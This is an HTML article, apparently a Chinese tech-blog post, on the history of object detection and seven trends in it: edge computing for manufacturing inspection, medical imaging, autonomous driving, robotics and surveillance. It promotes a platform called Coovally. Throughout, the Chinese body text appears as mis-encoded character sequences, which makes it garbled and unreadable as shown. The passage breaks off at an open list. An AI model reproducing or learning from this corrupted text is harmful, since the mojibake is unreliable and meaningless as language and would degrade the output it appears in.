<p>åœ¨æ·±å…¥æ¢è®¨æœªæ¥è¶‹åŠ¿ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆé€€ä¸€æ­¥ï¼Œçœ‹çœ‹ä»€ä¹ˆæ˜¯ç›®æ ‡æ£€æµ‹ï¼Œå®ƒçš„å¹•ååŸç†æ˜¯ä»€ä¹ˆï¼Œä»¥åŠè¿™äº›å¹´æ¥å®ƒæ˜¯å¦‚ä½•å‘å±•çš„ã€‚</p>
<p>ç›®æ ‡æ£€æµ‹æ˜¯è®¡ç®—æœºè§†è§‰çš„å…³é”®éƒ¨åˆ†ï¼Œå®ƒä½¿å¾—AIç³»ç»Ÿèƒ½å¤Ÿè¯†åˆ«å›¾åƒå†…å®¹å¹¶ç²¾ç¡®ç¡®å®šæ¯ä¸ªç‰©ä½“çš„ä½ç½®ã€‚ä¸ºäº†å­¦ä¼šè¿™ä¸€ç‚¹ï¼Œæ¨¡å‹éœ€è¦åœ¨å¤§é‡æ ‡æ³¨è¿‡çš„æ•°æ®é›†ä¸Šè¿›è¡Œè®­ç»ƒï¼Œè¿™äº›æ•°æ®é›†å±•ç°äº†ç‰©ä½“åœ¨å„ç§ä¸åŒæ¡ä»¶ä¸‹çš„æ ·è²Œï¼Œæ¯”å¦‚ä¸åŒçš„è§’åº¦ã€å…‰çº¿ã€å¤§å°å’Œå¸ƒå±€ã€‚</p>
<p>éšç€æ—¶é—´çš„æ¨ç§»ï¼Œæ¨¡å‹ä¼šå­¦ä¼šåŒºåˆ†ä¸åŒç‰©ä½“çš„æ¨¡å¼å’Œè§†è§‰çº¿ç´¢ã€‚ä¸€æ—¦è®­ç»ƒå®Œæˆï¼ŒåƒUltralytics YOLOè¿™æ ·çš„è§†è§‰AIæ¨¡å‹å¯ä»¥ä¸€æ¬¡æ€§æ‰«ææ•´ä¸ªå›¾åƒï¼Œå³æ—¶ç»˜åˆ¶å‡ºè¾¹ç•Œæ¡†å¹¶åˆ†é…æ ‡ç­¾ã€‚è¿™ç§é€Ÿåº¦å’Œå‡†ç¡®æ€§ï¼Œæ­£æ˜¯ç›®æ ‡æ£€æµ‹èƒ½å¤Ÿåœ¨ä¼—å¤šå®é™…åº”ç”¨ä¸­äº§ç”Ÿå·¨å¤§å½±å“çš„åŸå› ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/839d9ce7a3c84fc0a04e5500e32ebe5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=MCl8IiW3JsSZ5TWmOnE%2FWptMJog%3D" alt="screenshot_2025-12-04_10-50-14.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>ç›®æ ‡æ£€æµ‹çš„å®é™…åº”ç”¨æ¡ˆä¾‹</strong></h2>
<p>ä¾‹å¦‚ï¼Œåœ¨æ–‡æ¡£åˆ†æé¢†åŸŸï¼ŒåƒPrezentè¿™æ ·çš„å…¬å¸å°±åˆ©ç”¨ç›®æ ‡æ£€æµ‹æŠ€æœ¯ï¼Œæ¥è‡ªåŠ¨åŒ–é‡æ–°è®¾è®¡æ¼”ç¤ºæ–‡ç¨¿å¹»ç¯ç‰‡è¿™é¡¹é¢‡å…·æŒ‘æˆ˜æ€§çš„ä»»åŠ¡ã€‚ä¼ ç»Ÿä¸Šï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦æ•°å°æ—¶çš„äººå·¥è°ƒæ•´ï¼šè¯†åˆ«æ ‡é¢˜ã€é‡æ–°å®šä½æ–‡æœ¬æ¡†ã€å¯¹é½å›¾åƒã€é‡å»ºå›¾è¡¨ï¼ŒåŒæ—¶è¿˜è¦å°½åŠ›ä¿æŒç‰ˆé¢çš„æ•´æ´ä¸ç»Ÿä¸€ã€‚</p>
<p>é€šè¿‡å°†æ¯å¼ å¹»ç¯ç‰‡è½¬æ¢ä¸ºå›¾åƒï¼ŒYOLOæ¨¡å‹å¯ä»¥æ£€æµ‹å‡ºæ ‡é¢˜ã€æ–‡æœ¬æ¡†ã€å›¾ç‰‡å’Œå›¾è¡¨ï¼ŒåŒæ—¶ä¿ç•™åŸå§‹ç»“æ„ã€‚è¿™ä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿå‡†ç¡®ç†è§£æ¯ä¸ªå…ƒç´ æ˜¯å¦‚ä½•æ’åˆ—çš„ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæ›¾ç»ç¼“æ…¢è€Œç¹ççš„æ•´ä¸ªé‡æ–°è®¾è®¡è¿‡ç¨‹ï¼Œç°åœ¨åªéœ€å‡ ç§’é’Ÿå°±èƒ½è‡ªåŠ¨å®Œæˆã€‚</p>
<h2 data-id="heading-2"><strong>è®¡ç®—æœºè§†è§‰ä¸­ç›®æ ‡æ£€æµ‹çš„æ¼”å˜å†ç¨‹</strong></h2>
<p>ä»¥ä¸‹æ˜¯ç›®æ ‡æ£€æµ‹æŠ€æœ¯å¤šå¹´æ¥å‘å±•å†ç¨‹çš„ç®€è¦å›é¡¾ï¼š</p>
<ul>
<li><strong>æ—©æœŸé˜¶æ®µï¼ˆ1960å¹´ä»£-1970å¹´ä»£ï¼‰ï¼š</strong> Â æ—©æœŸçš„ç›®æ ‡æ£€æµ‹æ–¹æ³•æºè‡ªä¼ ç»Ÿçš„å›¾åƒå¤„ç†ï¼Œé€šå¸¸ä¾èµ–äºæ¨¡æ¿åŒ¹é…ã€‚è¿™ç§æ–¹æ³•å°†å›¾åƒçš„å„ä¸ªéƒ¨åˆ†ï¼ˆåƒç´ ï¼‰ä¸é¢„å®šä¹‰çš„å‚è€ƒæ¨¡å¼ï¼ˆå³æ¨¡æ¿ï¼‰è¿›è¡Œæ¯”è¾ƒä»¥å¯»æ‰¾ç›¸ä¼¼æ€§ã€‚ç”±äºè¿™äº›æ¨¡æ¿æ˜¯å›ºå®šçš„ï¼Œæ— æ³•é€‚åº”å˜åŒ–ï¼Œå› æ­¤è¯¥æ–¹æ³•åªåœ¨ç†æƒ³æ¡ä»¶ä¸‹æœ‰æ•ˆã€‚å³ä½¿æ˜¯å…‰ç…§ã€å°ºåº¦ã€æ—‹è½¬æˆ–ç‰©ä½“å¤–è§‚çš„å¾®å°å˜åŒ–ï¼Œéƒ½å¯èƒ½å¯¼è‡´å¤±è´¥ã€‚</li>
<li><strong>åŸºäºç‰¹å¾çš„æ£€æµ‹ï¼ˆ1990å¹´ä»£-2000å¹´ä»£ï¼‰ï¼š</strong> Â éšåï¼Œç ”ç©¶äººå‘˜è½¬å‘äº†æ‰‹å·¥ç‰¹å¾å’Œç‰¹å¾æå–çš„æ€è·¯ï¼Œå³äººä¸ºå®šä¹‰è®¡ç®—æœºåº”è¯¥å¯»æ‰¾çš„è§†è§‰çº¿ç´¢ï¼Œä¾‹å¦‚è¾¹ç¼˜ã€è§’ç‚¹ã€å½¢çŠ¶æˆ–äº®åº¦çš„å˜åŒ–ã€‚Haarçº§è”ï¼ˆä¸€ç§æ‰«æç®€å•è§†è§‰æ¨¡å¼çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºäººè„¸æ£€æµ‹ï¼‰å’Œæ–¹å‘æ¢¯åº¦ç›´æ–¹å›¾ï¼ˆä¸€ç§æ•æ‰å›¾åƒä¸­è¾¹ç¼˜å’Œè½®å»“æ–¹å‘çš„æŠ€æœ¯ï¼‰ç­‰æŠ€æœ¯ï¼Œé€šå¸¸ä¸æ”¯æŒå‘é‡æœºåˆ†ç±»å™¨ï¼ˆä¸€ç§å°†ç‰©ä½“åˆ†ç±»çš„æœºå™¨å­¦ä¹ æ¨¡å‹ï¼‰ç»“åˆä½¿ç”¨ï¼Œä½¿ç›®æ ‡è¯†åˆ«æ›´å‡†ç¡®ã€æ›´å¿«é€Ÿã€‚å°½ç®¡æœ‰è¿™äº›æ”¹è¿›ï¼Œè¿™äº›ç³»ç»Ÿä»ç„¶éš¾ä»¥è¾¾åˆ°å®æ—¶è¿è¡Œçš„é€Ÿåº¦ã€‚</li>
<li><strong>æ·±åº¦å­¦ä¹ æ¨¡å‹é©å‘½ï¼ˆ2010å¹´ä»£ï¼‰ï¼š</strong> Â æ·±åº¦å­¦ä¹ å’Œå·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼Œä¸€ç§é€šè¿‡é€å°åŒºåŸŸæ‰«æå›¾åƒæ¥å­¦ä¹ è§†è§‰æ¨¡å¼çš„æ¨¡å‹ï¼‰é‡æ–°å®šä¹‰äº†ç›®æ ‡æ£€æµ‹ã€‚åƒR-CNNã€Fast R-CNNå’ŒFaster R-CNNè¿™æ ·çš„æ¨¡å‹ç›´æ¥ä»æµ·é‡æ•°æ®ä¸­å­¦ä¹ è§†è§‰æ¨¡å¼ã€‚è¿™å¸¦æ¥äº†é«˜ç²¾åº¦çš„è¾“å‡ºï¼Œä½†è¿™äº›æ¨¡å‹ä»ç„¶é¢ä¸´å»¶è¿Ÿé—®é¢˜ã€‚</li>
<li><strong>YOLOå®ç°å®æ—¶æ£€æµ‹ï¼ˆ2010å¹´ä»£ä¸­æœŸï¼‰ï¼š</strong> Â YOLOï¼ˆä½ åªçœ‹ä¸€æ¬¡ï¼‰æ ‡å¿—ç€ç›®æ ‡æ£€æµ‹çš„é‡å¤§çªç ´ï¼Œå®ƒé€šè¿‡ç½‘ç»œçš„ä¸€æ¬¡å‰å‘ä¼ æ’­å°±é¢„æµ‹å‡ºæ‰€æœ‰è¾¹ç•Œæ¡†å’Œç±»åˆ«æ ‡ç­¾ã€‚è¿™ç§ç»Ÿä¸€çš„æ–¹æ³•æå¤§åœ°æé«˜äº†æ£€æµ‹é€Ÿåº¦ï¼Œä¸ºå®æ—¶åº”ç”¨é“ºå¹³äº†é“è·¯ã€‚å¤§çº¦åœ¨åŒä¸€æ—¶æœŸï¼ŒåƒSSDï¼ˆå•å‘å¤šæ¡†æ£€æµ‹å™¨ï¼‰è¿™æ ·çš„å…¶ä»–å•æ¬¡æ£€æµ‹æ¨¡å‹ä¹Ÿé€šè¿‡ç§»é™¤åŒºåŸŸæè®®æ­¥éª¤ï¼Œæå‡äº†æ€§èƒ½ï¼Œä½¿ç›®æ ‡æ£€æµ‹æ›´å¿«ã€æ›´é«˜æ•ˆã€‚</li>
<li><strong>è¿‘æœŸè¿›å±•ï¼ˆ2020å¹´ä»£ï¼‰ï¼š</strong> å¾—ç›Šäºæ¨¡å‹è®¾è®¡å’Œä¼˜åŒ–çš„é‡å¤§æ”¹è¿›ï¼Œ2020å¹´ä»£å¸¦æ¥äº†æ›´å¿«ã€æ›´å‡†ç¡®çš„æœ€å…ˆè¿›ç›®æ ‡æ£€æµ‹ç³»ç»Ÿå’Œæ¡†æ¶ã€‚ YOLO11å¼•å…¥äº†æ¶æ„å‡çº§ï¼Œæé«˜äº†å¤„ç†é€Ÿåº¦ã€å‡†ç¡®æ€§å’Œæ•´ä½“å®æ—¶æ€§èƒ½ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå³å°†æ¨å‡ºçš„YOLO26é‡‡ç”¨äº†æ›´é«˜æ•ˆã€æ›´è½»é‡åŒ–çš„è®¾è®¡ï¼Œä½¿å…¶éå¸¸é€‚åˆå¹¿æ³›çš„å®é™…åº”ç”¨ã€‚</li>
</ul>
<h2 data-id="heading-3"><strong>å¡‘é€ æœªæ¥çš„7å¤§ç›®æ ‡æ£€æµ‹è¶‹åŠ¿</strong></h2>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬æ¢è®¨ä¸ƒä¸ªæ–°å…´çš„ç›®æ ‡æ£€æµ‹è¶‹åŠ¿ï¼Œè¿™äº›è¶‹åŠ¿æ­£åœ¨è®¡ç®—æœºè§†è§‰é¢†åŸŸå¼•å‘å…³æ³¨å’Œçƒ­è®®ã€‚</p>
<ul>
<li><strong>å€ŸåŠ©è¾¹ç¼˜è®¡ç®—ï¼Œå®ç°æ›´æ™ºèƒ½çš„ç›®æ ‡æ£€æµ‹ä»»åŠ¡</strong></li>
</ul>
<p>ä¼ ç»Ÿçš„äººå·¥æ£€æŸ¥å¯èƒ½ä¼šæ‹–æ…¢ç”Ÿäº§çº¿é€Ÿåº¦ï¼Œå¹¶å®¹æ˜“æ¼æ£€ç¼ºé™·ã€‚ä¸ºäº†åº”å¯¹è¿™ä¸€é—®é¢˜ï¼Œè®¸å¤šå…¬å¸å¼€å§‹è½¬å‘ç”±ç›®æ ‡æ£€æµ‹æŠ€æœ¯é©±åŠ¨çš„AIè´¨é‡æ§åˆ¶ç³»ç»Ÿã€‚</p>
<p>äº‹å®ä¸Šï¼Œç ”ç©¶è¡¨æ˜ï¼Œä¸äººå·¥æ£€æµ‹ç›¸æ¯”ï¼ŒåŸºäºAIçš„è§†è§‰æ£€æµ‹å¯ä»¥æ˜¾è‘—æé«˜ç”Ÿäº§ç‡ï¼ˆæœ‰æ—¶ç”šè‡³é«˜è¾¾50%ï¼‰ï¼Œå¹¶å°†ç¼ºé™·æ£€æµ‹ç‡æå‡å¤šè¾¾90%ã€‚æœ‰è¶£çš„æ˜¯ï¼Œåœ¨è¿™ä¸€é¢†åŸŸåŠå…¶ä»–è§†è§‰AIåº”ç”¨ä¸­ï¼Œæ­£åœ¨æ€èµ·æ–°æµªæ½®çš„è¶‹åŠ¿æ˜¯ï¼šé€šè¿‡è¾¹ç¼˜è®¡ç®—ï¼Œåˆ†æç°åœ¨ç›´æ¥åœ¨è®¾å¤‡æœ¬èº«ä¸Šè¿›è¡Œã€‚</p>
<p>å€ŸåŠ©è¾¹ç¼˜è®¡ç®—ï¼Œæ™ºèƒ½è¢«ç§»åˆ°ç¦»æ•°æ®é‡‡é›†ç‚¹æ›´è¿‘çš„åœ°æ–¹ã€‚æ‘„åƒå¤´å’Œä¼ æ„Ÿå™¨å¯ä»¥ç°åœºè¿è¡Œç›®æ ‡æ£€æµ‹æ¨¡å‹ï¼Œå³æ—¶è¯†åˆ«ç‰©ä½“å¹¶ç¡®å®šå…¶ä½ç½®ï¼Œè€Œæ— éœ€ä¾èµ–äº‘ç«¯å¤„ç†ã€‚è¿™ä½¿å¾—å®ƒä»¬èƒ½å¤Ÿå®æ—¶åˆ†æå›¾åƒå¸§ã€‚</p>
<p>è¿™è¿˜å‡å°‘äº†ç½‘ç»œå»¶è¿Ÿï¼Œé™ä½äº†å¸¦å®½ä½¿ç”¨ï¼Œå¹¶ç¡®ä¿äº†å³ä½¿åœ¨ç½‘ç»œè¿æ¥ä¸ç¨³å®šæˆ–ä¸å¯ç”¨æ—¶ï¼Œç³»ç»Ÿä¹Ÿèƒ½æŒç»­å·¥ä½œã€‚å¯¹äºåˆ¶é€ ä¸šç­‰å¿«èŠ‚å¥ç¯å¢ƒè€Œè¨€ï¼Œè½¬å‘è®¾å¤‡ç«¯å¤„ç†èƒ½å¸¦æ¥æ›´å¿«çš„å“åº”ã€æ›´æµç•…çš„æ“ä½œå’Œæ›´å¯é çš„ç»“æœã€‚</p>
<p>åœ¨åˆ¶é€ ä¸šè´¨æ£€ä¸­ï¼ŒAIèƒ½æå¤§æå‡æ•ˆç‡ã€‚è€Œå®ç°è¿™ä¸€ç‚¹çš„å…³é”®ï¼Œåœ¨äºå°†æ¨¡å‹é«˜æ•ˆéƒ¨ç½²åˆ°è¾¹ç¼˜è®¾å¤‡ã€‚Coovallyå¹³å°æä¾›çš„ä¸€ç«™å¼æ¨¡å‹è½¬æ¢ä¸éƒ¨ç½²æœåŠ¡ï¼Œæ­£ç®€åŒ–äº†è¿™ä¸€è¿‡ç¨‹ï¼Œå¸®åŠ©ä¼ä¸šå°†è®­ç»ƒå¥½çš„æ£€æµ‹æ¨¡å‹å¿«é€Ÿè½¬åŒ–ä¸ºå¯åœ¨è¾¹ç¼˜è®¾å¤‡ä¸Šè¿è¡Œçš„å½¢å¼ï¼Œä»è€Œå®ç°å®æ—¶ã€æœ¬åœ°çš„è´¨é‡åˆ¤å®šã€‚</p>
<ul>
<li><strong>åŒ»ç–—ä¿å¥é¢†åŸŸçš„è§†è§‰è¾…åŠ©è¯Šæ–­</strong></li>
</ul>
<p>åŒ»ç”Ÿä»¬å¸¸å¸¸èŠ±è´¹å¤§é‡æ—¶é—´æŸ¥çœ‹åŒ»å­¦å½±åƒï¼Œä»¥ç¡®ä¿ä¸ä¼šé—æ¼ä»»ä½•ä¿¡æ¯ã€‚å¦‚ä»Šï¼Œè®¸å¤šåŒ»é™¢å¼€å§‹æ¢ç´¢å°–ç«¯çš„ç›®æ ‡æ£€æµ‹æŠ€æœ¯æ¥å¸®åŠ©åŠ å¿«è¿™ä¸€è¿‡ç¨‹ã€‚è¿™åæ˜ äº†åŒ»ç–—ä¿å¥é¢†åŸŸçš„ä¸€ä¸ªæ›´å¹¿æ³›è¶‹åŠ¿ï¼šè§†è§‰AIæ­£è¶Šæ¥è¶Šå¤šåœ°ç”¨äºæ”¯æŒæ—©æœŸæ£€æµ‹ã€å¿«é€Ÿè¯Šæ–­å’Œæ›´ä¸€è‡´çš„å½±åƒåˆ†æã€‚</p>
<p>ç›®æ ‡æ£€æµ‹å¯ç”¨äºå¿«é€Ÿçªæ˜¾å¯èƒ½éœ€è¦å…³æ³¨çš„åŒºåŸŸï¼Œä»è€Œè¾…åŠ©å†³ç­–å¹¶æ”¹å–„æ‚£è€…æ²»ç–—æ•ˆæœã€‚ä¾‹å¦‚ï¼ŒåƒYOLO11è¿™æ ·çš„æ¨¡å‹å¯ä»¥å¸®åŠ©åŒ»ç”Ÿåœ¨MRIæ‰«æä¸­å‘ç°è„‘è‚¿ç˜¤ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abc798c766ff4f9fa0543c04372b09f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=UnRpytSyxHQRt6iV4gMG3JI4sEw%3D" alt="screenshot_2025-12-04_10-50-25.png" loading="lazy"/></p>
<p>ç”±äºYOLO11èƒ½å¤Ÿè¯†åˆ«MRIæ‰«æä¸­çš„ç»†å¾®æ¨¡å¼ï¼Œå®ƒå¯ä»¥å¸®åŠ©æ›´å‡†ç¡®åœ°å‘ç°å°å‹æˆ–æ—©æœŸè‚¿ç˜¤ã€‚è™½ç„¶åŒ»ç”Ÿåšå‡ºæœ€ç»ˆè¯Šæ–­ï¼Œä½†åƒYOLO11è¿™æ ·çš„å·¥å…·å¯ä»¥é€šè¿‡æ›´æ—©åœ°æç¤ºæ½œåœ¨é—®é¢˜æ¥å¸®åŠ©ç®€åŒ–ä»–ä»¬çš„å®¡é˜…å·¥ä½œï¼Œç¡®ä¿é‡è¦çš„ä¿¡æ¯ä¸è¢«é—æ¼ã€‚</p>
<ul>
<li><strong>è‡ªåŠ¨é©¾é©¶æ±½è½¦ä¸å®æ—¶è§†è§‰ï¼ŒåŠ©åŠ›æ›´å®‰å…¨çš„å‡ºè¡Œ</strong></li>
</ul>
<p>åœ¨ç¹å¿™çš„åŸå¸‚è¡—é“ä¸Šï¼Œè‡ªåŠ¨é©¾é©¶æ±½è½¦ä¾èµ–æ‘„åƒå¤´å’Œä¼ æ„Ÿå™¨æŒç»­ç›‘æ§å‘¨å›´ç¯å¢ƒã€‚è¿™äº›ç³»ç»Ÿå®æ—¶æ£€æµ‹è¡Œäººã€è½¦è¾†ã€è½¦é“å’Œè·¯æ ‡ã€‚å€ŸåŠ©è®¡ç®—æœºè§†è§‰å’Œç›®æ ‡æ£€æµ‹ç®—æ³•ï¼Œè‡ªåŠ¨é©¾é©¶æ±½è½¦èƒ½å¤Ÿè§£è¯»å‘¨å›´å‘ç”Ÿçš„æƒ…å†µï¼Œå¹¶åšå‡ºæ›´å®‰å…¨çš„è‡ªåŠ¨é©¾é©¶å†³ç­–ã€‚</p>
<p>åœ¨äº¤é€šæ¨¡å¼å¤šæ ·ã€è½¦è¾†æ··åˆè¡Œé©¶çš„åœ°åŒºï¼Œè¿™äº›ç³»ç»Ÿä¼šé¢ä¸´é¢å¤–çš„å¤æ‚æ€§ã€‚ä¾‹å¦‚ï¼Œæœ€è¿‘ä¸€é¡¹ç ”ç©¶è¯„ä¼°äº†Ultralytics YOLOv8æ¨¡å‹åœ¨æµ·å¾—æ‹‰å·´å’Œç­åŠ ç½—å°”æ”¶é›†çš„äº¤é€šæ•°æ®ä¸Šçš„è¡¨ç°ã€‚åœ¨è¿™äº›åœ°æ–¹ï¼Œæ±½è½¦ã€å…¬å…±æ±½è½¦ã€æ‘©æ‰˜è½¦ã€è‡ªè¡Œè½¦å’Œè‡ªåŠ¨äººåŠ›è½¦ç­‰å„ç§è½¦è¾†ä»¥åŠ¨æ€ä¸”å¸¸å¸¸éš¾ä»¥é¢„æµ‹çš„æ–¹å¼å…±äº«é“è·¯ã€‚</p>
<p>ç»“æœæ˜¾ç¤ºï¼ŒYOLOv8åœ¨è¿™äº›å……æ»¡æŒ‘æˆ˜çš„åœºæ™¯ä¸­è¡¨ç°å¼ºåŠ²ï¼Œå³ä½¿åœ¨å¯†é›†å’Œéç»“æ„åŒ–çš„äº¤é€šæ¡ä»¶ä¸‹ï¼Œä¹Ÿèƒ½å‡†ç¡®æ£€æµ‹å‡ºå„ç§ç‰©ä½“ã€‚è¿™å‡¸æ˜¾äº†è‡ªåŠ¨é©¾é©¶é¢†åŸŸçš„ä¸€ä¸ªæ—¥ç›Šå¢é•¿çš„è¶‹åŠ¿ï¼šè§†è§‰AIæ¨¡å‹æ­£å˜å¾—è¶Šæ¥è¶Šæœ‰èƒ½åŠ›å¤„ç†æ›¾ç»å¯¹è‡ªåŠ¨åŒ–ç³»ç»Ÿæ„æˆé‡å¤§æŒ‘æˆ˜çš„å¤æ‚ç°å®ç¯å¢ƒã€‚</p>
<ul>
<li><strong>åˆ©ç”¨è®¡ç®—æœºè§†è§‰å®ç°æ™ºèƒ½è‡ªåŠ¨åŒ–ä¸æœºå™¨äººæŠ€æœ¯</strong></li>
</ul>
<p>å¤„ç†å°ç‰©ä»¶ã€åˆ†æ‹£æ£€æµ‹åˆ°çš„ç‰©å“å’Œææ–™ï¼Œæˆ–åœ¨æ‚ä¹±ç©ºé—´ä¸­å¯¼èˆªï¼Œå¯¹æœºå™¨äººæ¥è¯´ä¸€ç›´æ˜¯ä¸ªæŒ‘æˆ˜ã€‚è¿™äº›ä»»åŠ¡éœ€è¦å¿«é€Ÿé€‚åº”å’Œç²¾ç¡®ç§»åŠ¨ï¼Œè€Œä¼ ç»Ÿçš„è‡ªåŠ¨åŒ–ç³»ç»Ÿåœ¨ä¸å¯é¢„æµ‹çš„ç¯å¢ƒä¸­å¾€å¾€éš¾ä»¥åº”å¯¹ã€‚</p>
<p>æœºå™¨äººæŠ€æœ¯çš„ä¸€ä¸ªå¢é•¿è¶‹åŠ¿æ˜¯åˆ©ç”¨è§†è§‰AIèµ‹äºˆæœºå™¨äººå®æ—¶æ„ŸçŸ¥å’Œå“åº”å‘¨å›´ç¯å¢ƒçš„èƒ½åŠ›ã€‚ä¸ºäº†æ¢ç´¢è¿™ä¸€è½¬å˜ï¼Œä¸€ç»„ç ”ç©¶äººå‘˜æœ€è¿‘å¼€å‘äº†ä¸€æ¬¾å®¶ç”¨æœºå™¨äººï¼Œå®ƒèƒ½å¤Ÿåœ¨å®¤å†…ç§»åŠ¨æ—¶è¯†åˆ«å’Œåˆ†æ‹£ç‰©ä½“ã€‚</p>
<p>è¯¥æœºå™¨äººä½¿ç”¨äº†åƒYOLO11è¿™æ ·çš„æ¨¡å‹è¿›è¡Œç›®æ ‡æ£€æµ‹ï¼Œç»“åˆæ·±åº¦æ‘„åƒå¤´å’Œçµæ´»çš„å¤¹çˆªï¼Œèƒ½å¤Ÿè‡ªä¸»è¯†åˆ«ä¸åŒå½¢çŠ¶å’Œå¤§å°çš„ç‰©å“ï¼Œå¹¶å°†å…¶æ”¾ç½®åˆ°æ­£ç¡®çš„ä½ç½®ã€‚è¿™ä¸ªå®éªŒå±•ç¤ºäº†å¦‚ä½•å°†è®¡ç®—æœºè§†è§‰ä¸æœºå™¨äººç³»ç»Ÿç»“åˆï¼Œä»¥æå‡ç©ºé—´æ„ŸçŸ¥å’Œå“åº”èƒ½åŠ›ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c1b022fa8e042fcba2050460515e25d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=aQhXjp3I2%2BrZY9IP87Fo2AB5%2FUc%3D" alt="screenshot_2025-12-04_10-50-44.png" loading="lazy"/></p>
<p>å®ƒè¿˜å±•ç¤ºäº†å°–ç«¯çš„AIæŠ€æœ¯å¦‚ä½•é€šè¿‡éšæ—¶é—´å­¦ä¹ è§†è§‰æ¨¡å¼ï¼Œå¸®åŠ©æœºå™¨äººé€‚åº”é™Œç”Ÿç¯å¢ƒã€‚éšç€è¿™äº›è¿›æ­¥ï¼Œæœºå™¨äººæ­£å˜å¾—è¶Šæ¥è¶Šèƒ½å¹²ï¼Œå¹¶æ›´å¤šåœ°èå…¥æ—¥å¸¸ä»»åŠ¡ä¸­ï¼Œä»å®¶åº­è¾…åŠ©åˆ°ä»“åº“ç‰©æµå’ŒåŒ»ç–—æ”¯æŒã€‚</p>
<p>è®©æœºå™¨äººå­¦ä¼šâ€œçœ‹â€å’Œâ€œå†³ç­–â€ï¼Œç¦»ä¸å¼€ç›®æ ‡æ£€æµ‹æ¨¡å‹çš„å¿«é€Ÿè¿­ä»£ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œé«˜æ•ˆçš„æ•°æ®å¤„ç†å’Œåˆ†æå·¥å…·è‡³å…³é‡è¦ã€‚ä¾‹å¦‚ï¼Œåœ¨è®­ç»ƒæœºå™¨äººè¯†åˆ«æŠ“å–ç‰©æ—¶ï¼ŒCoovallyæä¾›çš„å·¥å…·é›†å¯ä»¥å¸®åŠ©å¼€å‘è€…ç”Ÿæˆæ•°æ®åˆ†å¸ƒæŠ¥å‘Šã€å¯è§†åŒ–æ ‡ç­¾æ•ˆæœï¼Œç”šè‡³è¿›è¡Œæ•°æ®å¢å¼ºå’Œæ ‡ç­¾å½’ä¸€åŒ–ï¼Œè¿™äº›éƒ½èƒ½æœ‰æ•ˆæå‡æ¨¡å‹è®­ç»ƒçš„æ•°æ®è´¨é‡ä¸æ•ˆç‡ã€‚</p>
<ul>
<li><strong>ä¸»åŠ¨å¼ç›‘æ§ä¸å®‰é˜²ç³»ç»Ÿ</strong></li>
</ul>
<p>æ™ºèƒ½ç›‘æ§ç³»ç»Ÿæ­£åœ¨è¿…é€Ÿé‡‡ç”¨äººå·¥æ™ºèƒ½æ¥è¯†åˆ«å¼‚å¸¸æˆ–ä¸å®‰å…¨çš„æ´»åŠ¨ã€‚å€ŸåŠ©ç›®æ ‡æ£€æµ‹æ¨¡å‹ï¼Œæ‘„åƒå¤´å¯ä»¥å®æ—¶è¯†åˆ«æ½œåœ¨é—®é¢˜å¹¶ç«‹å³æé†’å®‰é˜²å›¢é˜Ÿï¼Œä»è€Œæœ‰åŠ©äºæ”¹å–„é¢„é˜²å’Œå“åº”ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨å‡ºäºå®‰å…¨åŸå› é™åˆ¶ä½¿ç”¨æ™ºèƒ½æ‰‹æœºçš„åˆ¶é€ å·¥å‚ä¸­ï¼ŒAIç³»ç»Ÿå¯ä»¥åˆ©ç”¨YOLOå’Œå…¶ä»–è§†è§‰æ¨¡å‹ï¼Œåœ¨æ‰‹æœºå‡ºç°çš„ç¬é—´è‡ªåŠ¨æ£€æµ‹åˆ°å®ƒä»¬å¹¶è·Ÿè¸ªå…¶ç§»åŠ¨ã€‚è¿™åæ˜ äº†å®‰é˜²é¢†åŸŸä¸€ä¸ªæ›´å¹¿æ³›çš„è¶‹åŠ¿ï¼šè§†è§‰AIæ­£è¢«ç”¨äºæ›´ä¸»åŠ¨åœ°ç›‘æ§ç¯å¢ƒï¼Œå¹¶å¯¹æ½œåœ¨é£é™©åšå‡ºæ›´å¿«ååº”ã€‚</p>
<p>é™¤äº†æ£€æµ‹ï¼Œè¿™äº›ç³»ç»Ÿæ­£æ—¥ç›Šä¸å…¶ä»–æŠ€æœ¯ç»“åˆï¼Œä»¥åˆ›å»ºæ›´å®Œæ•´çš„å®‰é˜²è§£å†³æ–¹æ¡ˆã€‚è¾¹ç¼˜è®¾å¤‡å…è®¸åœ¨æœ¬åœ°å¤„ç†è§†é¢‘ï¼Œå‡å°‘å»¶è¿Ÿå¹¶ä¿æŒæ€§èƒ½å¯é ï¼›è€Œåƒé—¨ç¦æ§åˆ¶ç³»ç»Ÿæˆ–é¢éƒ¨è¯†åˆ«è¿™æ ·çš„å·¥å…·åˆ™å¯ä»¥å¢åŠ é¢å¤–çš„éªŒè¯å±‚ã€‚è¿™äº›æŠ€æœ¯å…±åŒåä½œï¼Œåˆ›å»ºå‡ºæ›´æ™ºèƒ½ã€è¿æ¥æ›´ç´§å¯†çš„ç›‘æ§ç½‘ç»œï¼Œèƒ½å¤Ÿå¿«é€Ÿæœ‰æ•ˆåœ°åº”å¯¹ç°å®æƒ…å†µã€‚</p>
<ul>
